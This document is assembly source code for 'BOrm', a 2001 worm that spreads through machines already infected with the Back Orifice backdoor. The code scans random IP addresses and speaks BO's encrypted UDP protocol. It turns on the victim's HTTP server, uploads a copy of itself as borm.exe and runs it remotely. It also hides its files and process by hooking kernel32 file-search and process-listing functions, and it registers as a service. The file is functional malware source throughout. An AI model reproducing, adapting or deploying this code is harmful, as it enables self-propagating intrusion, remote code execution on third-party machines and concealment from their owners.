;BOrm - Back Orifice Worm
;(c) Vecna 2001

.586p
.model flat
locals

ofs equ offset
dwo equ dword ptr
wo  equ word ptr
by  equ byte ptr

callW macro api
  extrn api:PROC
       call api
endm

.xlist
include win32api.inc
include useful.inc
include mz.inc
include pe.inc
include socket.inc
.list

include borm.inc

.data

copyright db "BOrm by Vecna (c) 2001",0

IF USE_BO_PSW EQ TRUE
g_password db "vaca",0
ENDIF

fff_entry:
       push dwo [esp+8]
       push dwo [esp+8]
       call swap_fff
       call _fff
       call swap_fff
       cmp eax, -1
       je @@error
       call check_name2
       jnz @@error
       push dwo [esp+8]
       push dwo [esp+8]
       call fnf_entry
  @@error:
       ret 2*4

fnf_entry:
  @@retry:
       push dwo [esp+8]
       push dwo [esp+8]
       call swap_fnf
       call _fnf
       call swap_fnf
       test eax, eax
       jz @@error
       call check_name2
       jz @@retry
  @@error:
       ret 2*4

p32f_entry:
       push dwo [esp+8]
       push dwo [esp+8]
       call swap_p32f
       call _p32f
       call swap_p32f
       test eax, eax
       jz @@error
       call check_name
       jnz @@error
       push dwo [esp+8]
       push dwo [esp+8]
       call p32n_entry
  @@error:
       ret 2*4

p32n_entry:
  @@retry:
       push dwo [esp+8]
       push dwo [esp+8]
       call swap_p32n
       call _p32n
       call swap_p32n
       test eax, eax
       jz @@error
       call check_name
       jz @@retry
  @@error:
       ret 2*4

_fff:
       db 0b8h
  fff  dd 0
       jmp eax

_fnf:
       db 0b8h
  fnf  dd 0
       jmp eax

_p32f:
       db 0b8h
  p32f dd 0
       jmp eax

_p32n:
       db 0b8h
  p32n dd 0
       jmp eax

check_name2:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, 44
       jmp slash

check_name:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, 36
  slash:
       mov ebx, esi
  @@nxt_char:
       lodsb
       cmp al, "\"
       je slash
  @@no_slash:
       test al, al
       jnz @@nxt_char
  @@cmp_name:
       mov ebx,[ebx]
       or ebx,20202020h
       sub ebx, "mrob"
  @@isnot:
       popad
       ret

delta:
       call @@tmpdelta
  @@tmpdelta:
       pop ebp
       sub ebp, ofs @@tmpdelta
       ret

swap_fff:
       pushad
       call delta
       lea esi, [ebp+fff_code]
       mov edi, [ebp+fff]
       jmp swap_p32n__swap

swap_fnf:
       pushad
       call delta
       lea esi, [ebp+fnf_code]
       mov edi, [ebp+fnf]
       jmp swap_p32n__swap

swap_p32f:
       pushad
       call delta
       lea esi, [ebp+p32f_code]
       mov edi, [ebp+p32f]
       jmp swap_p32n__swap

swap_p32n:
       pushad
       call delta
       lea esi, [ebp+p32n_code]
       mov edi, [ebp+p32n]
  swap_p32n__swap:
       push dwo [edi]
       push dwo [edi+4]
       push dwo [esi]
       push dwo [esi+4]
       pop dwo [edi+4]
       pop dwo [edi]
       pop dwo [esi+4]
       pop dwo [esi]
       popad
       ret

p32n_code:
p32f_code equ p32n_code+8
fff_code  equ p32n_code+16
fnf_code  equ p32n_code+24

implant_size equ p32n_code-fff_entry

kernel32dll db 'KERNEL32.DLL',0

__fff  db "FindFirstFileA",0
__fnf  db "FindNextFileA",0
__p32f db "Process32First",0
__p32n db "Process32Next",0


bo_reg  db "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0
bo_name db "borm.exe",0
bo_port db "12345"
bo_null db 0

bo_http_header db "POST /upload.cgi\ HTTP/1.0 ",13,10
bo_http_header_size equ $-bo_http_header

bo_mime db "Content-Type: multipart/form-data; boundary=----_BOr"
bnd_cr  dd "_23m" xor "fab1"
        db 13,10
        db "Content-length: "
bo_size db "9999",13,10,13,10
bo_bnd  db "----_BOr"
bnd_cr2 dd "_23m" xor "fab1"

bo_bnd_size equ $-bo_bnd
        db 13,10,'Content-Disposition: form-data; name="filename"; filename="borm.exe"',13,10
        db 'Content-Type: application/octet-stream',13,10,13,10
bo_mime_size equ $-bo_mime

ip_mask_table:  ;DDCCBBAA
        dd      0FFFFFFFFh  ;0     *.*.*.*   X=local
        dd      0FFFFFF00h  ;1               *=random
        dd      0FFFFFF00h  ;2     X.*.*.*
        dd      0FFFFFF00h  ;3
        dd      0FFFFFF00h  ;4
        dd      0FFFF0000h  ;5     X.X.*.*
        dd      0FFFF0000h  ;6
        dd      0FFFF0000h  ;7

this_ip     dd ?
seed        dd ?
bo_ip       dd ?
bo_seed     dd ?
bo_dropsize dd ?
bo_dropper  dd ?
vxdcall0    dd ?

.code

getkey:
IF USE_BO_PSW EQ TRUE
       pushad
       mov esi, ofs g_password
       push esi
       sub ebx, ebx
       mov ecx,-1
  @@count:
       inc ecx
       lodsb
       movsx eax,al
       add ebx,eax                ;z+= g_password[x];
       test eax,eax
       jnz @@count
  @@done_count:
       pop esi
       test ecx,ecx
       jnz @@psw
       mov ebx,31337
       jmp @@return

  @@psw:
       sub ebp,ebp
  @@chksum:
       lodsb
       movsx eax,al
       lea edx,[ecx+1]
       imul eax,edx
       bt ebp,0
       jnc @@odd
       sub ebx,eax
       jmp @@adjust
  @@odd:
       add ebx,eax
  @@adjust:
       and ebx, 7fffh             ;z = z%RAND_MAX;
       inc ebp
       loop @@chksum

  @@done_chksum:
       imul ebx,ebp               ;z = (z * y)%RAND_MAX
       and ebx, 7fffh
  @@return:
       mov [bo_seed],ebx
       popad
ELSE
       mov [bo_seed],31337
ENDIF
       ret

BOcrypt:                                ;size@4/buffer@8
       pushad

       mov ecx, [esp.cPushad.Arg1]
       test ecx,ecx
       jz @@done

       mov esi, [esp.cPushad.Arg2]
       call getkey

  @@crypt:
       mov eax,[bo_seed]
       imul eax,eax,214013
       add eax,2531011
       mov [bo_seed],eax
       shr eax,8

       lodsb
       xor al,ah
       mov [esi-1],al
       loop @@crypt
  @@done:
       popad
       ret 4*2

send_bo_ping:
       pushad
       sub esp, (MAGICSTRINGLEN+(4*2)+2)+16+BUFFSIZE

       mov esi,esp
       mov edi,esi

;header(2D)+size_of_packet(D)+count(D)+TYPE(B)
       mov eax,"Q*!*"
       stosd
       mov eax,"?YTW"
       stosd

       mov eax, MAGICSTRINGLEN+(4*2)+2
       stosd
       mov eax,-1
       stosd
       mov eax, TYPE_PING
       stosw                    ;+0

       push esi
       push MAGICSTRINGLEN+(4*2)+2
       call BOcrypt

       mov ebx,edi
       mov eax, AF_INET
       stosw
       mov eax, PORT
       xchg al,ah
       stosw
       call gen_ip
       stosd
       sub eax,eax
       stosd
       stosd

       push IPPROTO_UDP
       push SOCK_DGRAM
       push AF_INET
       callW socket
       push eax

;sendto(sock, buff, size, 0, (struct sockaddr *)&host, sizeof(host))
       push 16
       push ebx
       push 0
       push MAGICSTRINGLEN+(4*2)+2
       push esi
       push eax
       callW sendto

       mov esi,[esp]          ;esi==socket

       push esi
       push 1
       mov eax,esp

       push 0
       push 4                   ;wait 4 seconds

       push esp
       push 0
       push 0
       push eax
       push 0
       callW select

       add esp,4*4

       dec eax
       jnz @@error

;recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&host, &hostsize)
       push 0
       push 0
       push 0
       push BUFFSIZE
       push edi
       push esi
       callW recvfrom

       push edi
       push eax
       call BOcrypt

       xchg esi, edi                    ;edi==socket
       lodsd
       sub eax,"Q*!*"
       jnz @@error
       lodsd
       sub eax,"?YTW"
       jnz @@error

       cmp by [esi+8],TYPE_PING
       jnz @@error

       mov eax,[ebx.sin_addr]
       mov [bo_ip],eax

       sub esp,200h
       mov esi,esp

       push ofs bo_null
       push ofs bo_reg
       push TYPE_REGISTRYENUMVALS
       call sendpacket

  @@reg_redo:
       call getinput
       test eax,eax
       jnz @@error_esp

       cmp dwo [esi],   'mmoC'
       jne @@reg_checkend
       cmp dwo [esi+4], 'S no'
       jne @@reg_checkend
       cmp dwo [esi+8], 'trat'
       jne @@reg_checkend

       push edi
       mov edi,esi
       push esi

  @@bo_reg_start:
       lodsb
       sub al, "'"
       jnz @@bo_reg_start

  @@reg_copy:
       lodsb
       cmp al, "'"
       jne @@bo_reg_skip
       sub eax,eax
  @@bo_reg_skip:
       stosb
       test al,al
       jnz @@reg_copy

       pop esi
       add esi, 100h
       pop edi

  @@reg_checkend:
       cmp dwo [esi],'fo d'             ;"End of..."
       jne @@reg_redo

       lea eax,[esi-100h]
       push eax
       push ofs bo_port
       push TYPE_HTTPENABLE
       call sendpacket
       call getinput

       push 1*1000
       callW Sleep                      ;wait remote HTTP server startup

       pushad
       sub esp, 200h
       mov esi, esp

       push IPPROTO_IP
       push SOCK_STREAM
       push AF_INET
       callW socket
       mov ebx, eax

       push 0
       push 0
       push dwo [bo_ip]
       push 039300002h
       mov eax, esp

       push 10h
       push eax
       push ebx
       callW connect                    ;connect to www server in port 12345
       add esp, 4*4
       test eax, eax
       jnz @@error_http

       push 0
       push bo_http_header_size
       push ofs bo_http_header
       push ebx
       callW send                       ;send http POST header

       push 0
       push dwo [bo_dropsize]
       push dwo [bo_dropper]
       push ebx
       callW send                       ;send mime binary virus

       mov eax,esp
       push 0
       push 200h
       push eax
       push ebx
       callW recv
       push 2                           ;SD_BOTH
       push ebx
       callW shutdown

  @@error_http:
       push ebx
       callW closesocket

       push 3*1000
       callW Sleep                      ;wait da stuff complete

       add esp, 200h
       popad

       push ofs bo_null
       push ofs bo_null
       push TYPE_HTTPDISABLE
       call sendpacket                  ;disable http server
       call getinput

       sub esi, 100h

       push ofs bo_null
       push esi

       pushad
  @@bo_search_endz:
       lodsb
       test al,al
       jnz @@bo_search_endz
       mov by [esi-1],'\'
       mov edi, ofs bo_name
       xchg edi,esi
  @@bo_copy_name:
       lodsb
       stosb
       test al,al
       jnz @@bo_copy_name
       popad

       push TYPE_PROCESSSPAWN
       call sendpacket                          ;execute remote copy
       call getinput

  @@error_esp:
       add esp, 200h

  @@error:
       callW closesocket

       add esp, (MAGICSTRINGLEN+(4*2)+2)+16+BUFFSIZE
       popad
       ret

sendpacket:             ;type/arg1/arg2
       pushad                          ;ebx==sock/edi==socket

       mov esi,[esp.cPushad.Arg3]
       push esi
       callW lstrlenA
       mov ebp, eax
       mov esi,[esp.cPushad.Arg2]
       push esi
       callW lstrlenA

       lea ebp,[eax+ebp+8+(4*2)+3]

       push ebp
       push 40h
       callW GlobalAlloc
       test eax,eax
       jz @@done

       push eax
       mov edi, eax

;size = MAGICSTRINGLEN + (sizeof(long)*2) + 3 + strlen(str1) + strlen(str2)
       mov eax,"Q*!*"
       stosd
       mov eax,"?YTW"
       stosd

       mov eax, ebp
       stosd
       mov eax,-1
       stosd
       mov eax, [esp.cPushad.Arg1.Pshd]
       stosb

       push esi
       callW lstrlenA
       mov ecx, eax
       rep movsb
       mov eax,ecx
       stosb

       mov esi,[esp.cPushad.Arg3.Pshd]
       push esi
       callW lstrlenA
       mov ecx, eax
       rep movsb

       push dwo [esp]
       push ebp
       call BOcrypt

;sendto(sock, buff, size, 0, (struct sockaddr *)&host, sizeof(host)
       push 16
       push dwo [esp.Pushad_ebx.Pshd.Pshd]         ;Pushad_ebx
       push 0
       push ebp
       push dwo [esp.(Pshd*4)]               ;[esp]
       push dwo [esp.Pushad_edi.(Pshd*6)]           ;pushad_edi
       callW sendto

  @@done_free:
       callW GlobalFree

  @@done:
       popad
       ret 3*4

getinput:
       pushad                           ;esi==outbuffer/edi==socket
       sub esp, BUFFSIZE
       mov edi,esp

       mov dwo [esi],0

       mov esi, dwo [esp.Pushad_edi+BUFFSIZE]          ;pushad_edi

       push esi
       push 1
       mov eax,esp

       push 0
       push 4                   ;wait 4 seconds

       push esp
       push 0
       push 0
       push eax
       push 0
       callW select

       add esp,4*4

       dec eax
       jnz @@error

;recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&host, &hostsize)
       push 0
       push 0
       push 0
       push BUFFSIZE
       push edi
       push esi
       callW recvfrom

       push edi
       push eax
       call BOcrypt

       xchg esi, edi                    ;edi==socket
       lodsd
       sub eax,"Q*!*"
       jnz @@error
       lodsd
       sub eax,"?YTW"
       jnz @@error

       add esi,11
       mov edi,[esp.Pushad_esi+BUFFSIZE]
  @@bo_cpy:
       lodsb
       stosb
       test al,al
       jnz @@bo_cpy

       sub eax,eax
  @@error:
       add esp, BUFFSIZE
       mov [esp.Pushad_eax],eax
       popad
       ret

gen_ip:
       pushad
  @@get_ip:
       call random_ip_byte
       mov bh, al          ; d
       call random_ip_byte
       mov bl, al          ; c
       shl ebx, 16
       call random_ip_byte
       mov bh, al          ; b
       call random_ip_byte
       mov bl, al          ; a

       call random_eax
       and eax, 7
       mov eax, [ofs ip_mask_table+eax*4]

       and ebx, eax
       not eax
       and eax, [this_ip]
       or ebx, eax

       cmp bl, 127
       je @@get_ip

       cmp ebx, [this_ip]
       je @@get_ip

       mov [esp+7*4],ebx
       popad
       ret

random_ip_byte:
       call random_eax
       cmp al, 0
       je random_ip_byte
       cmp al, 255
       je random_ip_byte
       ret

random_eax:
       push ecx
       push edx
  @@random:
       mov eax,[seed]
       mov ecx,41c64e6dh
       mul ecx
       add eax,3039h
       and eax,7ffffffh
       mov [seed], eax
       pop edx
       pop ecx
       ret

bo_thread:
;       pushad
  @@retry:
       call send_bo_ping
       push 1000*THREADZ
       callW Sleep
       jmp @@retry
;       popad
;       ret 4

main:
       sub esp, 200h
       mov esi, esp

       xor dwo [bnd_cr],"fab1"
       xor dwo [bnd_cr2],"fab1"

       push esi
       push 101h
       callW WSAStartup

       push 200h
       push esi
       callW gethostname

       push esi
       callW gethostbyname
       mov eax, [eax+16]
       mov eax, [eax]
       mov [this_ip], eax

       push 200h
       push esi
       push 0
       callW GetModuleFileNameA

       push 0
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push 0
       push FILE_SHARE_READ
       push GENERIC_READ
       push esi
       callW CreateFileA
       mov ebx, eax

       push 0
       push ebx
       callW GetFileSize
       mov ebp,eax

       add eax, bo_mime_size+bo_bnd_size+8
       mov [bo_dropsize],eax

       push 10
       pop ecx
       mov edi, ofs bo_size
       push -1
  @@div:
       sub edx,edx
       div ecx
       push edx
       test eax,eax
       jnz @@div
  @@pop:
       pop eax
       inc eax
       jz @@done
       add al, "0"-1
       stosb
       jmp @@pop

  @@done:
       push dwo [bo_dropsize]
       push 40h
       callW GlobalAlloc
       mov [bo_dropper], eax

       mov edi, eax
       mov ecx, bo_mime_size
       mov esi, ofs bo_mime
       rep movsb

       push 0
       mov eax,esp
       push 0
       push eax
       push ebp
       push edi
       push ebx
       callW ReadFile
       pop eax
       add edi,eax

       mov ecx, bo_bnd_size+4
       mov esi, ofs bo_bnd-4
       rep movsb

       mov eax, "--"
       stosd

       push 1
       push 0
       callW RegisterServiceProcess

       push ofs kernel32dll
       callW GetModuleHandleA
       mov ebx, eax
       mov eax, [ebx.MZ_lfanew]
       lea edi, [eax.ebx-4]
       mov esi, [edi+78h+4]
       mov esi, [esi+ebx+1ch]
       mov ecx, [esi+ebx]
       add ecx, ebx
       mov [vxdcall0], ecx

  extrn GetProcAddress:PROC
       mov esi, ofs GetProcAddress
       push ofs __fff
       push ebx
       push ofs __fnf
       push ebx
       push ofs __p32f
       push ebx
       push ofs __p32n
       push ebx
       call esi
       mov dwo [p32n],eax
       call esi
       mov dwo [p32f],eax
       call esi
       mov dwo [fnf],eax
       call esi
       mov dwo [fff],eax

       push edi
       call deprotect

       cmp dwo [edi], -1
       je exit
       mov dwo [edi], -1

       movzx ecx, wo [edi+4+6]
       lea esi, [edi+4+0f8h]
       mov edx, implant_size+32
  @@section_loop:
       mov eax, [esi+36]
       and eax, 0C0000040h
       cmp eax, 0C0000040h
       jne @@next_section
       mov eax, [esi+16]
       mov edi, [esi+8]
       sub eax, edi
       cmp eax, edx
       jb @@next_section
       add [esi+8], edx
       add edi, [esi+12]
       add edi, ebx
       jmp @@copy_code
  @@next_section:
       add esi, 40
       loop @@section_loop
       jmp exit

  @@copy_code:
       mov ecx,edx
       mov edx, edi
       mov esi, ofs fff_entry
       cld
       rep movsb
       mov edi, [fff]
       lea esi, [edx+(fff_code-fff_entry)]
       call patch
       mov edi, [fnf]
       lea esi, [edx+(fnf_code-fff_entry)]
       call patch
       add dwo [edi-4], (fnf_entry-fff_entry)
       mov edi, [p32f]
       lea esi, [edx+(p32f_code-fff_entry)]
       call patch
       add dwo [edi-4], (p32f_entry-fff_entry)
       mov edi, [p32n]
       lea esi, [edx+(p32n_code-fff_entry)]
       call patch
       add dwo [edi-4], (p32n_entry-fff_entry)

       push THREADZ
       pop ecx
  @@fork:
       push ecx

       push 0

       push esp
       push 0
       push 0
       push ofs bo_thread
       push 0
       push 0
       callW CreateThread
       pop eax

       pop ecx
       loop @@fork

       push -1
       callW Sleep

  exit:
       push -1
       callW ExitProcess

patch:
       push edi
       xchg esi, edi
       movsd
       movsd
       mov edi, [esp]
       call deprotect
       mov al, 0e9h
       stosb
       stosd
       mov eax, edx
       sub eax, edi
       mov [edi-4], eax
       ret

deprotect:
       pushad
       mov eax, [esp+(8*4)+4]
       shr eax, 12
       push 020060000h
       push ebp
       push 1
       push eax
       push 00001000dh
       call dwo [vxdcall0]
       popad
       ret 4

end    main

